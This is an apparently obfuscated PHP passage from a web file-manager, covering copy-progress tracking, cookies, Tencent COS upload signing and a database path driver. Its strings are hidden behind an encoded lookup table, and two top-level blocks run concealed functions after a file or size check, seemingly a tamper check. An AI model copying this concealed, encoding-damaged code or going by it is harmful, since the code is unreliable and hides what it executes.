$this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÊÁâ·œ ) { } public function sourceAddHashEnd($™Œş™†Á) { } public function sourceAddFileStart($Ü½ãš¤É) { $Ì©ÊÜã‚ =& $_SERVER[•Ùç É]; $òÑ‚Íê— =& $this->task; $òÑ‚Íê—[$Ì©ÊÜã‚[1758]] = $Ü½ãš¤É[$Ì©ÊÜã‚[78]]; $òÑ‚Íê—[$Ì©ÊÜã‚[1756]] = $Ü½ãš¤É[$Ì©ÊÜã‚[32]]; $òÑ‚Íê—[$Ì©ÊÜã‚[1115]] = $Ü½ãš¤É[$Ì©ÊÜã‚[32]]; $òÑ‚Íê—[$Ì©ÊÜã‚[1769]] = $Ü½ãš¤É[$Ì©ÊÜã‚[86]]; $this->update(); } public function sourceAddFileEnd($ÕáúÎ™š) { $ÄñÌå’ =& $_SERVER[•Ùç É]; $©ŒÀ Ÿ¯ =& $this->task; $©ŒÀ Ÿ¯[$ÄñÌå’[1763]] += $ÕáúÎ™š[$ÄñÌå’[78]]; $©ŒÀ Ÿ¯[$ÄñÌå’[1769]] = $ÕáúÎ™š[$ÄñÌå’[86]]; $this->update(1); } public function copyFileStart($Áæ§±¨ı, $÷ÃÉª¸Ç, $’¹ùñÌ, $¶ë‘ÛŞŸ, $êä“±ÄÑ, $‘¥Î÷ñ¡) { $±Ú¬Èµà =& $_SERVER[•Ùç É]; $³ ºí× = $êä“±ÄÑ; if ($³ ºí× == $GLOBALS[$±Ú¬Èµà[1770]]) { $³ ºí× = $GLOBALS[$±Ú¬Èµà[1771]]; } $GLOBALS[$±Ú¬Èµà[1771]] = $êä“±ÄÑ; $GLOBALS[$±Ú¬Èµà[1770]] = $‘¥Î÷ñ¡; $†ÙéÃ³º =& $this->task; $†ÙéÃ³º[$±Ú¬Èµà[1756]] = $³ ºí×; $†ÙéÃ³º[$±Ú¬Èµà[1758]] = (int) $Áæ§±¨ı->size($÷ÃÉª¸Ç); $†ÙéÃ³º[$±Ú¬Èµà[1759]] = 0; $†ÙéÃ³º[$±Ú¬Èµà[1115]] = $±Ú¬Èµà[12]; $†ÙéÃ³º[$±Ú¬Èµà[1760]] = $±Ú¬Èµà[12]; $†ÙéÃ³º[$±Ú¬Èµà[1761]] = 0; $ÑÜ¢¶Ùğ = $†ÙéÃ³º[$±Ú¬Èµà[1758]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($†ÙéÃ³º[$±Ú¬Èµà[445]] . $±Ú¬Èµà[1772]); if ($ÑÜ¢¶Ùğ && file_exists(get_path_father($¶ë‘ÛŞŸ))) { Cache::set($†ÙéÃ³º[$±Ú¬Èµà[445]] . $±Ú¬Èµà[1772], $¶ë‘ÛŞŸ); $†ÙéÃ³º[$±Ú¬Èµà[1729]] = array($±Ú¬Èµà[1773], $±Ú¬Èµà[1774]); } $this->update(0, $ÑÜ¢¶Ùğ); } public static function updateCopyLocalFileSize($À¿œ–°¿) { $”ÚÊ•äº =& $_SERVER[•Ùç É]; $‡ğÍúÃÀ = Cache::get($À¿œ–°¿[$”ÚÊ•äº[445]] . $”ÚÊ•äº[1772]); if (!$‡ğÍúÃÀ || !file_exists($‡ğÍúÃÀ)) { return $À¿œ–°¿; } $À¿œ–°¿[$”ÚÊ•äº[1759]] = @filesize($‡ğÍúÃÀ); $À¿œ–°¿[$”ÚÊ•äº[1763]] += $À¿œ–°¿[$”ÚÊ•äº[1759]]; self::updateTask($À¿œ–°¿); return $À¿œ–°¿; } public function copyFileEnd($¹¨®èªû, $°…ş½½Â, $Çó•Ò’, $İ“‘•º, $°ûü†Íö, $ğæñÎˆÚ) { $…¦•´ş =& $_SERVER[•Ùç É]; $Øæ×Ó­ˆ =& $this->task; $Øæ×Ó­ˆ[$…¦•´ş[1759]] = $Øæ×Ó­ˆ[$…¦•´ş[1758]]; $Øæ×Ó­ˆ[$…¦•´ş[1760]] = $…¦•´ş[12]; unset($Øæ×Ó­ˆ[$…¦•´ş[1729]]); if ($°ûü†Íö == $Øæ×Ó­ˆ[$…¦•´ş[1756]]) { $Øæ×Ó­ˆ[$…¦•´ş[1762]] += $Øæ×Ó­ˆ[$…¦•´ş[1758]]; $Øæ×Ó­ˆ[$…¦•´ş[1763]] = $Øæ×Ó­ˆ[$…¦•´ş[1762]]; $€ ûÅ—ï = 1; if (isset($Øæ×Ó­ˆ[$…¦•´ş[1769]]) && $Øæ×Ó­ˆ[$…¦•´ş[1769]] == $°…ş½½Â) { $€ ûÅ—ï = 0; } $this->update($€ ûÅ—ï); } else { $this->update(); $Øæ×Ó­ˆ[$…¦•´ş[1759]] = 0; } Cache::remove($Øæ×Ó­ˆ[$…¦•´ş[445]] . $…¦•´ş[1772]); self::log($…¦•´ş[1775] . $°…ş½½Â . $…¦•´ş[72] . $İ“‘•º . $…¦•´ş[248] . $°ûü†Íö . $…¦•´ş[1776] . $Øæ×Ó­ˆ[$…¦•´ş[1756]]); } public function updateFileEnd($Œ³¢®÷×, $³ÅÈœĞÀ) { $ìşıáò =& $_SERVER[•Ùç É]; $ı’à‡İ„ =& $this->task; $ı’à‡İ„[$ìşıáò[1756]] = $Œ³¢®÷×; $ı’à‡İ„[$ìşıáò[1758]] = $³ÅÈœĞÀ; $ı’à‡İ„[$ìşıáò[1762]] += $³ÅÈœĞÀ; $ı’à‡İ„[$ìşıáò[1763]] = $ı’à‡İ„[$ìşıáò[1762]]; $this->update(1); self::log($ìşıáò[1777] . $Œ³¢®÷×); } public function sourceModelCopy($ãüéŠæĞ) { $ê†öò¾Ş =& $_SERVER[•Ùç É]; $å‰¢º’ = $ãüéŠæĞ[0]; $ª‚‡¨“è = $ãüéŠæĞ[1]; $§ÃÃÁÎƒ =& $this->task; $this->sourceModelCopyFlag = !0; $››‘˜”¨ = 0; switch ($å‰¢º’) { case $ê†öò¾Ş[605]: $››‘˜”¨ = 1; break; case $ê†öò¾Ş[608]: $§ÃÃÁÎƒ[$ê†öò¾Ş[1756]] = $ª‚‡¨“è[$ê†öò¾Ş[32]]; break; case $ê†öò¾Ş[610]: $››‘˜”¨ = intval($ãüéŠæĞ[$ê†öò¾Ş[426]] * 0.4); break; case $ê†öò¾Ş[612]: $››‘˜”¨ = intval($ãüéŠæĞ[$ê†öò¾Ş[426]] * 0.2); break; case $ê†öò¾Ş[614]: $››‘˜”¨ = intval($ãüéŠæĞ[$ê†öò¾Ş[426]] * 0.4); break; } $this->update($››‘˜”¨); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ØªÑù»›, $¿Å¼Ù—Ô) { $û‘¿ö ¥ =& $_SERVER[•Ùç É]; $this->sourceModelCopyFlag = !0; $ú¦â²„„ = 1; if (isset($ØªÑù»›[$û‘¿ö ¥[81]])) { $ú¦â²„„ = $ØªÑù»›[$û‘¿ö ¥[81]][$û‘¿ö ¥[79]]; $ú¦â²„„ = $ú¦â²„„ + $ØªÑù»›[$û‘¿ö ¥[81]][$û‘¿ö ¥[80]] + 1; } $this->update($ú¦â²„„); $this->sourceModelCopyFlag = !1; } public function sourceMove($İğ¤‹çÅ) { $this->sourceRemove($İğ¤‹çÅ, !1); } public function curlProgress($³“®ñ»å, $£ò†¶‚, $¤Åæ‰Ôä, $‡øŒí·™, $Çî¬™ü½) { $¶ÕÕ› =& $_SERVER[•Ùç É]; $İ±‹ˆ€Œ =& $this->task; if ($Çî¬™ü½ > 0) { $İ±‹ˆ€Œ[$¶ÕÕ›[1115]] = $¶ÕÕ›[1778]; $İ±‹ˆ€Œ[$¶ÕÕ›[1760]] = $¶ÕÕ›[109]; if ($İ±‹ˆ€Œ[$¶ÕÕ›[1758]]) { $İ±‹ˆ€Œ[$¶ÕÕ›[1759]] = $Çî¬™ü½; } if ($İ±‹ˆ€Œ[$¶ÕÕ›[1761]]) { $İ±‹ˆ€Œ[$¶ÕÕ›[1759]] = $Çî¬™ü½ + $İ±‹ˆ€Œ[$¶ÕÕ›[1761]]; } } else { if ($¤Åæ‰Ôä > 0) { if ($İ±‹ˆ€Œ[$¶ÕÕ›[1758]] == $£ò†¶‚) { $İ±‹ˆ€Œ[$¶ÕÕ›[1759]] = $¤Åæ‰Ôä; $İ±‹ˆ€Œ[$¶ÕÕ›[1115]] = $¶ÕÕ›[1779]; $İ±‹ˆ€Œ[$¶ÕÕ›[1760]] = $¶ÕÕ›[1245]; } } } $this->update(); } public function curlProgressStart($Ğ“Ë¤¼½) { } public function curlProgressEnd($Ù¤ŠÄ„ç) { $®¤‡ó©ú =& $_SERVER[•Ùç É]; $Ê¹äúˆ× =& $this->task; $®º‹äË = curl_getinfo($Ù¤ŠÄ„ç); $Æ¬îîÚ = $®º‹äË[$®¤‡ó©ú[1780]]; if ($Æ¬îîÚ == -1) { $Æ¬îîÚ = $®º‹äË[$®¤‡ó©ú[1781]]; } if ($Ê¹äúˆ×[$®¤‡ó©ú[1760]] == $®¤‡ó©ú[109] && $Æ¬îîÚ) { $Ê¹äúˆ×[$®¤‡ó©ú[1761]] += $Æ¬îîÚ; } $this->update(); } } if ($_SERVER[$_SERVER[•Ùç É][922]] != $_SERVER[$_SERVER[•Ùç É][1782]]) { $_getc = $_SERVER[•Ùç É][925]; $_getfile = $_SERVER[$_SERVER[•Ùç É][926]] . $_SERVER[•Ùç É][927]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[•Ùç É][248], $_getfilec); if (count($_getarrs) < $_SERVER[•Ùç É][692]) { $exit = $_SERVER[•Ùç É][928]; $exit(); } $_act = $_SERVER[•Ùç É][932]; $_act($_SERVER[$_SERVER[•Ùç É][923]]); } goto Fåµòé‚Ò; DÏ‡ Œöö”: $_size = $_SERVER[•Ùç É][931]; if ($_SERVER[$_SERVER[•Ùç É][922]] != $_size($_file)) { $_getc = $_SERVER[•Ùç É][925]; $_getfile = $_SERVER[$_SERVER[•Ùç É][926]] . $_SERVER[•Ùç É][927]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[•Ùç É][248], $_getfilec); if (count($_getarrs) < $_SERVER[•Ùç É][692]) { $exit = $_SERVER[•Ùç É][928]; $exit(); } $_act = $_SERVER[•Ùç É][932]; $_act($_file); } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($òÒá—ˆÖ = '', $€ãÊË­ = 0) { if (is_string($òÒá—ˆÖ) && $òÒá—ˆÖ != $_SERVER[•Ùç É][12]) { $this->prefix = $òÒá—ˆÖ; } if (is_numeric($€ãÊË­) && $€ãÊË­ > 0) { $this->expire = $€ãÊË­; } } public static function getInstance() { static $®Ø¾•Ø“; if ($®Ø¾•Ø“ === null) { $®Ø¾•Ø“ = new self(); } return $®Ø¾•Ø“; } private static $cookieDisable = false; public static function disable($»°Ï÷Éö) { self::$cookieDisable = $»°Ï÷Éö; } private static $sameCookieSet = array(); public static function set($ìş¢ÙıÂ, $ƒî€¹êƒ, $ü‹ä¯®‡ = 0, $½ÃàÙÅí = false, $ÓªÆİŸ = false) { $Ñİù«Äê =& $_SERVER[•Ùç É]; if (self::$cookieDisable) { return; } if (!$ü‹ä¯®‡) { $ü‹ä¯®‡ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ìş¢ÙıÂ]) && self::$sameCookieSet[$ìş¢ÙıÂ] == $ƒî€¹êƒ . $ü‹ä¯®‡) { return; } self::$sameCookieSet[$ìş¢ÙıÂ] = $ƒî€¹êƒ . $ü‹ä¯®‡; if (!$ÓªÆİŸ) { $ÓªÆİŸ = str_replace(HOST, $Ñİù«Äê[12], APP_HOST); $ÓªÆİŸ = _get($GLOBALS, $Ñİù«Äê[933], $ÓªÆİŸ); } $óÀÛòòĞ = $Ñİù«Äê[12]; setcookie($ìş¢ÙıÂ, $ƒî€¹êƒ, time() + $ü‹ä¯®‡, $Ñİù«Äê[8] . trim($ÓªÆİŸ, $Ñİù«Äê[8]) . $óÀÛòòĞ, !1, !1, $½ÃàÙÅí); } public static function setSafe($ß´…ö¨€, $ÍŞîÕÑ, $¼…ò°â = 0) { self::set($ß´…ö¨€, $ÍŞîÕÑ, $¼…ò°â, !0); } public static function get($­ğ·ŠÑÜ) { static $éÉİ¶šõ = false; if (!$éÉİ¶šõ) { self::initHeaderCookie(); $éÉİ¶šõ = !0; } return isset($_COOKIE[$­ğ·ŠÑÜ]) ? $_COOKIE[$­ğ·ŠÑÜ] : !1; } private static function initHeaderCookie() { $ºê´ß¹‘ =& $_SERVER[•Ùç É]; if (!isset($_SERVER[$ºê´ß¹‘[934]]) || !$_SERVER[$ºê´ß¹‘[934]]) { return; } $°¥…Óà = explode($ºê´ß¹‘[73], $_SERVER[$ºê´ß¹‘[934]]); foreach ($°¥…Óà as $ÅÌéÁî) { $ÅÌéÁî = explode($ºê´ß¹‘[935], $ÅÌéÁî); if (count($ÅÌéÁî) != 2 || !isset($ÅÌéÁî[1])) { continue; } $_COOKIE[trim($ÅÌéÁî[0])] = trim($ÅÌéÁî[1]); } } public static function remove($„ÍÍ¢´, $ŸªşğË• = false) { unset($_COOKIE[$„ÍÍ¢´]); self::set($„ÍÍ¢´, $_SERVER[•Ùç É][12], 1, $ŸªşğË•); } } goto Eä¾š´Ï§Î; bôÕÚ£æÛŒ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ş³±Ù¶) { parent::__construct($Ş³±Ù¶); $this->signatureVersion($_SERVER[•Ùç É][233]); } public function uploadFormData($ûŞø‡, $µ†™œÅ’ = 3600) { $¥¥¿¶’» =& $_SERVER[•Ùç É]; $…®Êæù = $¥¥¿¶’»[215]; $ÖÕıüéï = $¥¥¿¶’»[249]; $Ëç”ôü = $¥¥¿¶’»[259]; $øÏ‡²¨„ = gmdate($¥¥¿¶’»[1376], time() + $µ†™œÅ’); $ˆÆÙß = (string) time() . $¥¥¿¶’»[73] . (string) (time() + $µ†™œÅ’); $šÜ–¥¥¢ = array($¥¥¿¶’»[260] => $øÏ‡²¨„, $¥¥¿¶’»[263] => array(array($¥¥¿¶’»[265] => $…®Êæù), array($¥¥¿¶’»[264] => $this->bucket), array($¥¥¿¶’»[266], $¥¥¿¶’»[267], $¥¥¿¶’»[12]), array($¥¥¿¶’»[270] => $Ëç”ôü), array($¥¥¿¶’»[1377] => $ÖÕıüéï), array($¥¥¿¶’»[1378] => $this->accessKey), array($¥¥¿¶’»[1379] => $ˆÆÙß))); $šÜ–¥¥¢ = json_encode($šÜ–¥¥¢); $©½Ó¼ÂÑ = hash_hmac($¥¥¿¶’»[249], $ˆÆÙß, $this->secret); $åü¨Ì¨÷ = sha1($šÜ–¥¥¢); $™ÇøÉ• = hash_hmac($¥¥¿¶’»[249], $åü¨Ì¨÷, $©½Ó¼ÂÑ); $ğ¦¥†ª = array($¥¥¿¶’»[265] => $…®Êæù, $¥¥¿¶’»[270] => $Ëç”ôü, $¥¥¿¶’»[278] => base64_encode($šÜ–¥¥¢), $¥¥¿¶’»[1377] => $ÖÕıüéï, $¥¥¿¶’»[1378] => $this->accessKey, $¥¥¿¶’»[1380] => $ˆÆÙß, $¥¥¿¶’»[1381] => $™ÇøÉ•, $¥¥¿¶’»[198] => $this->getHost()); return $ğ¦¥†ª; } public function fileOutLink($˜¼¾½ÆŒ) { $µ¦„úüŒ =& $_SERVER[•Ùç É]; if (substr($˜¼¾½ÆŒ, 0, 7) == $µ¦„úüŒ[1382]) { $˜¼¾½ÆŒ = $µ¦„úüŒ[1383] . substr($˜¼¾½ÆŒ, 7); } header($µ¦„úüŒ[164] . $˜¼¾½ÆŒ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ÂŒ•Íˆª) { $this->pathParse = $ÂŒ•Íˆª; $this->model = Model($_SERVER[•Ùç É][1384]); } public function getPath($ã«ö´·) { return trim($ã«ö´·, $_SERVER[•Ùç É][8]); } public function pathFather($ÃõÅ’·) { $Ëş…´ï = $this->parse($ÃõÅ’·); $Ëş…´ï = $this->infoSimple($ÃõÅ’·); return $Ëş…´ï ? $Ëş…´ï[$_SERVER[•Ùç É][182]] : !1; } public function pathThis($›Û¤İ’–) { $Šáª¶¦Ë = $this->infoSimple($›Û¤İ’–); return $Šáª¶¦Ë ? $Šáª¶¦Ë[$_SERVER[•Ùç É][32]] : !1; } public function getPathOuter($¿ÈêÈÊ) { if (!$¿ÈêÈÊ) { return $¿ÈêÈÊ; } $¶Ì¸†Ğõ = $this->parse($¿ÈêÈÊ); return KodIO::make($¶Ì¸†Ğõ[$_SERVER[•Ùç É][445]]); } public function copyFolderFromIO($‡œàîã, $Ì¤ÏÊ¼–, $¦Š‡Ô…, $Õ£ıÈÒ, $ÏèÙü„Ã) { $äìÅ÷¾› = $this->model->copyFolderFromIO($‡œàîã, $Ì¤ÏÊ¼–, $¦Š‡Ô…, $Õ£ıÈÒ, $ÏèÙü„Ã); return KodIO::make($äìÅ÷¾›); } public function isParentOf($ÎºÚÇî·, $ëÅô“ßÏ) { return $this->model->isParentOf($ÎºÚÇî·, $ëÅô“ßÏ); } public function mkfile($‰áú…É·, $ùÒÇ˜·‚ = '', $Ó’ÚÛà = REPEAT_RENAME) { $ñè×Ù›À =& $_SERVER[•Ùç É]; $İÑâ’ĞÈ = $this->parse($‰áú…É·); $‰áú…É· = $İÑâ’ĞÈ[$ñè×Ù›À[445]]; for ($’ÒÛçíŒ = 0; $’ÒÛçíŒ < count($İÑâ’ĞÈ[$ñè×Ù›À[1385]]); $’ÒÛçíŒ++) { $ëçéæİï = $İÑâ’ĞÈ[$ñè×Ù›À[1385]][$’ÒÛçíŒ]; if ($’ÒÛçíŒ == count($İÑâ’ĞÈ[$ñè×Ù›À[1385]]) - 1) { $‰áú…É· = $this->model->mkfile($‰áú…É·, $ëçéæİï, $ùÒÇ˜·‚, $Ó’ÚÛà); break; } $‰áú…É· = $this->model->mkdir($‰áú…É·, $ëçéæİï, REPEAT_SKIP); } return $this->getPathOuter($‰áú…É·); } public function mkdir($·¸†®ñ, $èı”êÂ = REPEAT_SKIP) { $”Ç‘æ¼ù =& $_SERVER[•Ùç É]; $­’üâ¬Ú = $this->parse($·¸†®ñ); $·¸†®ñ = $­’üâ¬Ú[$”Ç‘æ¼ù[445]]; for ($Ñ¸’‚›á = 0; $Ñ¸’‚›á < count($­’üâ¬Ú[$”Ç‘æ¼ù[1385]]); $Ñ¸’‚›á++) { $ŸŞñÄı× = $­’üâ¬Ú[$”Ç‘æ¼ù[1385]][$Ñ¸’‚›á]; $·¸†®ñ = $this->model->mkdir($·¸†®ñ, $ŸŞñÄı×, $èı”êÂ); } return $this->getPathOuter($·¸†®ñ); } public function copyFile($£åû¾ŒÀ, $áî¼ßÊÉ, $‚ÄÀŠâÑ = REPEAT_REPLACE) { $ƒ—•¼¨Ò =& $_SERVER[•Ùç É]; $ÈßÕ…â‹ = $this->parse($áî¼ßÊÉ); $ş© Ñ‹¯ = $this->model->copy($£åû¾ŒÀ, $ÈßÕ…â‹[$ƒ—•¼¨Ò[445]], $‚ÄÀŠâÑ, $ÈßÕ…â‹[$ƒ—•¼¨Ò[86]]); return $ş© Ñ‹¯ ? $this->getPathOuter($ş© Ñ‹¯) : !1; } public function moveFile($‚‡š„Û¡, $¡Ä¹ÏĞ€, $®™®¥× = REPEAT_REPLACE) { $­İ®Ï¶ =& $_SERVER[•Ùç É]; $Ò¯İÚÖÓ = $this->parse($¡Ä¹ÏĞ€); $öê°²¯ = $this->model->move($‚‡š„Û¡, $Ò¯İÚÖÓ[$­İ®Ï¶[445]], $®™®¥×, $Ò¯İÚÖÓ[$­İ®Ï¶[86]]); return $öê°²¯ ? $this->getPathOuter($öê°²¯) : !1; } public function copy($Êœú¡¶–, $ŒŒ€‹ÈÆ, $ÕÀå¿À = REPEAT_REPLACE, $°£„Æİ = false) { $§œ£‘«‚ = $this->parse($ŒŒ€‹ÈÆ); $ÀÈ’Ûı½ = $this->model->copy($Êœú¡¶–, $§œ£‘«‚[$_SERVER[•Ùç É][445]], $ÕÀå¿À, $°£„Æİ); return $ÀÈ’Ûı½ ? $this->getPathOuter($ÀÈ’Ûı½) : !1; } public function moveSameAllow() { } public function move($øöÜ‘Èé, $ôÊ…‹¸¨, $üğß…Ñ… = REPEAT_REPLACE, $ëÜğËÀş = false) { $ëöÏ§ª¿ = $this->parse($ôÊ…‹¸¨); $¶İ½Ï•ñ = $this->model->move($øöÜ‘Èé, $ëöÏ§ª¿[$_SERVER[•Ùç É][445]], $üğß…Ñ…, $ëÜğËÀş); return $¶İ½Ï•ñ ? $this->getPathOuter($¶İ½Ï•ñ) : !1; } public function remove($ƒ†íİÉÅ, $¬ß´µ = true) { return $this->model->remove($ƒ†íİÉÅ, $¬ß´µ); } public function rename($“„¤ ŠÖ, $àµ¹»ïï) { $å”—£”™ = $this->model->rename($“„¤ ŠÖ, $àµ¹»ïï); return $å”—£”™ ? $this->getPathOuter($“„¤ ŠÖ) : $å”—£”™; } public function size($õÍ¡şßù) { $–ÖæóİÖ = $this->infoSimple($õÍ¡şßù); return $–ÖæóİÖ ? $–ÖæóİÖ[$_SERVER[•Ùç É][78]] : 0; } public function infoSimple($î³¦Ûù) { return $this->model->sourceInfo($î³¦Ûù); } public function info($”Ä˜†¥Ä) { return $this->infoParse($”Ä˜†¥Ä); } public function infoAuth($ç´å) { return $this->infoParse($ç´å, !1, !0); } public function infoWithChildren($ï–àû¤£) { return $this->infoParse($ï–àû¤£, !0); } protected function infoParse($å³ñÃü, $ı­Ïé = false, $Ğõ¨Šß = false) { if (!$ı­Ïé) { return $this->model->pathInfo($å³ñÃü, $Ğõ¨Šß); } return $this->model->pathInfoMore($å³ñÃü); } public function infoFullSimple($¦Ò¿¬Ñ±) { $§…›”÷¿ =& $_SERVER[•Ùç É]; $ïèŞ“å = explode($§…›”÷¿[8], $¦Ò¿¬Ñ±); $ï¯ĞÎÎÖ = implode($§…›”÷¿[8], array_splice($ïèŞ“å, 1)); return $this->model->pathInfoByPath($ïèŞ“å[0], $ï¯ĞÎÎÖ); } public function infoFull($‹‚Ÿı×û) { $Â±Öìë™ = $this->infoFullSimple($‹‚Ÿı×û); return is_array($Â±Öìë™) ? $this->model->pathInfo($Â±Öìë™[$_SERVER[•Ùç É][183]]) : !1; } public function hashSimple($ß¬˜ÎŞ²) { $¥³ÃäÀ£ =& $_SERVER[•Ùç É]; $ÉòŞ¤Éİ = $this->infoWithChildren($ß¬˜ÎŞ²); return $ÉòŞ¤Éİ[$¥³ÃäÀ£[519]][$¥³ÃäÀ£[642]]; } public function hashMd5($…ş´âğÆ) { $¾ÁŒ¾ñ‹ =& $_SERVER[•Ùç É]; $üãŞœ“Ã = $this->infoWithChildren($…ş´âğÆ); return $üãŞœ“Ã[$¾ÁŒ¾ñ‹[519]][$¾ÁŒ¾ñ‹[517]]; } public function exist($è‘°ú‹³) { $ø‚°Á =& $_SERVER[•Ùç É]; $…Şªºèå = $this->parse($è‘°ú‹³); if (!$…Şªºèå[$ø‚°Á[86]]) { return $this->isFile($è‘°ú‹³) || $this->isFolder($è‘°ú‹³); } $ŠöŸü„ä = array($ø‚°Á[447] => $…Şªºèå[$ø‚°Á[445]], $ø‚°Á[32] => $…Şªºèå[$ø‚°Á[86]]); $ææ¡×öé = $this->model->where($ŠöŸü„ä)->find(); return $ææ¡×öé ? !0 : !1; } public function isFile($šÏ–¾éÀ) { $“´÷†£× =& $_SERVER[•Ùç É]; $—Ù›İ½æ = $this->infoSimple($šÏ–¾éÀ); return $—Ù›İ½æ && $—Ù›İ½æ[$“´÷†£×[455]] == $“´÷†£×[214] ? !0 : !1; } public function isFolder($“ñ‘°‹) { $£¢¨¶ =& $_SERVER[•Ùç É]; $ñØ¹Ì„É = $this->infoSimple($“ñ‘°‹); return $ñØ¹Ì„É && $ñØ¹Ì„É[$£¢¨¶[455]] == $£¢¨¶[90] ? !0 : !1; } public function listPath($Æî°ÒÑÏ, $™×§ÆÍƒ = false) { $ ‚£îÂÚ =& $_SERVER[•Ùç É]; if ($Æî°ÒÑÏ == $ ‚£îÂÚ[12]) { return !1; } $‚å’òÜï = array($ ‚£îÂÚ[447] => $Æî°ÒÑÏ); if ($™×§ÆÍƒ) { return $this->model->listSource($‚å’òÜï, -1); } return $this->model->listSource($‚å’òÜï); } public function has($ÏÛÇÂø¾, $ëşŠ·˜ = false, $–ÎœñíÉ = null) { $¡ÍÆ¹¬ =& $_SERVER[•Ùç É]; $ÂºÀ‹§ = $this->infoWithChildren($ÏÛÇÂø¾); if ($ëşŠ·˜) { return array($¡ÍÆ¹¬[226] => $ÂºÀ‹§[$¡ÍÆ¹¬[226]], $¡ÍÆ¹¬[225] => $ÂºÀ‹§[$¡ÍÆ¹¬[225]]); } return $–ÎœñíÉ ? $ÂºÀ‹§[$¡ÍÆ¹¬[226]] : $ÂºÀ‹§[$¡ÍÆ¹¬[225]]; } public function listAll($®Ê€ÒâÚ) { $“€Ş¿©š = IO::info($this->pathParse[$_SERVER[•Ùç É][86]]); if (!$“€Ş¿©š) { return array(); } return $this->model->listAll($®Ê€ÒâÚ); } public function getContent($ŒÚ÷›Ù‰) { return $this->model->getContent($ŒÚ÷›Ù‰); } public function setContent($çŞ­íûÍ, $Èìô„‡ê = '') { return $this->model->setContent($çŞ­íûÍ, $Èìô„‡ê); } public function fileSubstr($Ì‘¯Å¯Â, $ìÛâ–€„, $Âü¢……Ù) { return $this->model->fileSubstr($Ì‘¯Å¯Â, $ìÛâ–€„, $Âü¢……Ù); } public function download($¸‹åµ˜Ğ, $òÒÌİ®œ = '') { $ÂôüÌÚ÷ = get_path_father($òÒÌİ®œ); $Ûò“Ïãã = get_path_this($òÒÌİ®œ); $ğŞ‰š»İ = $this->model->fileInfoGet($¸‹åµ˜Ğ); $„‡÷İ¶ = IO::copy($ğŞ‰š»İ[$_SERVER[•Ùç É][86]], $ÂôüÌÚ÷, !1, $Ûò“Ïãã); return $„‡÷İ¶; } public function setModifyTime($´î‚¨ÌÙ, $îü¡ş´Ê = '') { $¯àŸ‹ =& $_SERVER[•Ùç É]; if (!$´î‚¨ÌÙ) { return; } $this->model->where(array($¯àŸ‹[461] => $´î‚¨ÌÙ))->save(array($¯àŸ‹[87] => $îü¡ş´Ê)); } public function upload($á„“–àí, $ğºöíéµ, $ç«œÑöÅ = false, $¬³¹¢µŒ = REPEAT_REPLACE) { $°ĞÛ¾ÓÔ =& $_SERVER[•Ùç É]; $°´“œ‰Š = $this->parse($á„“–àí); $¤°³º÷ = $this->model->addFile($°´“œ‰Š[$°ĞÛ¾ÓÔ[445]], $ğºöíéµ, $°´“œ‰Š[$°ĞÛ¾ÓÔ[86]], $ç«œÑöÅ, $¬³¹¢µŒ); return $this->getPathOuter($¤°³º÷); } public function uploadFileByID($¿š«º‘, $êÍ˜›‰¬, $ºÖş¿¢ã) { $©‡œñûÊ =& $_SERVER[•Ùç É]; $Îìğ¡Ì¨ = $this->parse($¿š«º‘); $ÙïŸ—ıŞ = $this->model->addFileByFileID($Îìğ¡Ì¨[$©‡œñûÊ[445]], $êÍ˜›‰¬, $Îìğ¡Ì¨[$©‡œñûÊ[86]], $ºÖş¿¢ã); return $this->getPathOuter($ÙïŸ—ıŞ); } public function addFileByRemote($³Ñ ¨ƒ§, $Úğ­÷½İ, $İôò˜şš = array(), $ùÎÛ§Ó = '', $ëÕ±¢©) { $ÀÒ€³ÌÕ =& $_SERVER[•Ùç É]; $û›·–­§ = $this->parse($³Ñ ¨ƒ§); $ùÎÛ§Ó = empty($ùÎÛ§Ó) ? $û›·–­§[$ÀÒ€³ÌÕ[86]] : $ùÎÛ§Ó; $åµ»›Û = $this->model->addFileByRemote($û›·–­§[$ÀÒ€³ÌÕ[445]], $Úğ­÷½İ, $ùÎÛ§Ó, $İôò˜şš, $ëÕ±¢©); return $this->getPathOuter($åµ»›Û); } public function uploadLink($ˆÕäøÅÎ, $ä¿£“º– = 0) { $Ã˜‚íÃ =& $_SERVER[•Ùç É]; $›ûùú¨Ë = $this->parse($ˆÕäøÅÎ); $…†áäÓ· = _get($GLOBALS[$Ã˜‚íÃ[7]], $Ã˜‚íÃ[1386]); $óß„àÙµ = _get($GLOBALS[$Ã˜‚íÃ[7]], $Ã˜‚íÃ[1387]); $ˆÕäøÅÎ = Model($Ã˜‚íÃ[644])->createFileName($›ûùú¨Ë[$Ã˜‚íÃ[86]], $…†áäÓ·, $óß„àÙµ); return IO::uploadLink($ˆÕäøÅÎ, $ä¿£“º–); } public function fileNameAuto($üüùŠ¸Ä, $Ô¹©š´–, $âïÆÒ“ = REPEAT_REPLACE, $‡ıÕº­Ã = false) { return $this->model->fileNameAuto($üüùŠ¸Ä, $Ô¹©š´–, $âïÆÒ“, $‡ıÕº­Ã); } public function fileNameExist($óİçÀ Œ, $İ¼ıÖä) { return $this->model->fileNameExist($óİçÀ Œ, $İ¼ıÖä); } protected function _fileOut($×ÇË…Ó®, $ãï¯øßè = false, $¿Ë¬ = false, $ß¿ó¨¶æ = '', $òÃ­€Ü = false) { $ş€¬’ö’ =& $_SERVER[•Ùç É]; $Š—ö²ÁÜ = $this->model->sourceInfo($×ÇË…Ó®); if ($Š—ö²ÁÜ[$ş€¬’ö’[455]] == $ş€¬’ö’[90]) { header($ş€¬’ö’[1388]); die; } $¾½ÊÉ‡£ = $this->model->fileInfoGet($×ÇË…Ó®); $ß¿ó¨¶æ = $¾½ÊÉ‡£[$ş€¬’ö’[517]] ? $¾½ÊÉ‡£[$ş€¬’ö’[517]] : $ß¿ó¨¶æ; $¿óóÙÂó = is_array($GLOBALS[$ş€¬’ö’[171]]) ? $GLOBALS[$ş€¬’ö’[171]][$ş€¬’ö’[32]] : $Š—ö²ÁÜ[$ş€¬’ö’[32]]; if ($òÃ­€Ü) { return 